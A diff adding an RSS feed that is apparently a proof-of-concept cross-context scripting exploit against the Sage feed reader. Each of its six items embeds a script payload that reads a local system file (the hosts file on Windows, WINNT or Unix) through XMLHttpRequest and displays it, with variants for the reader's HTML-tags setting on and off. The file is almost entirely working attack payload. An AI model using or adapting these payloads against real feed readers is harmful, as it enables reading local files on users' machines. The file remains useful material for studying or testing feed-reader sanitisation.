@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+	<channel>
+		<title>Cross Context Scripting with Sage</title>
+		<item>
+			<title>WINDOWS: works with "Allow HTML Tags" off</title>
+			<content:encoded><![CDATA[&lt;script&gt;try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/WINDOWS/system32/drivers/etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}&lt;/script&gt;]]></content:encoded>
+		</item>
+		<item>
+			<title>WINDOWS: works with "Allow HTML Tags" on</title>
+			<content:encoded><![CDATA[<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/WINDOWS/system32/drivers/etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}</script>]]></content:encoded>
+		</item>
+		<item>
+			<title>WINNT: works with "Allow HTML Tags" off</title>
+			<content:encoded><![CDATA[&lt;script&gt;try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/WINNT/system32/drivers/etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}&lt;/script&gt;]]></content:encoded>
+		</item>
+		<item>
+			<title>WINNT: works with "Allow HTML Tags" on</title>
+			<content:encoded><![CDATA[<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/WINNT/system32/drivers/etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}</script>]]></content:encoded>
+		</item>
+		<item>
+			<title>UNIX: works with "Allow HTML Tags" off</title>
+			<content:encoded><![CDATA[&lt;script&gt;try { request = new XMLHttpRequest(); request.open("GET", "file:///etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}&lt;/script&gt;]]></content:encoded>
+		</item>
+		<item>
+			<title>UNIX: works with "Allow HTML Tags" on</title>
+			<content:encoded><![CDATA[<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///etc/hosts"); request.send(null); alert(request.responseText); } catch(e) {}</script>]]></content:encoded>
+		</item>
+	</channel>
+</rss>
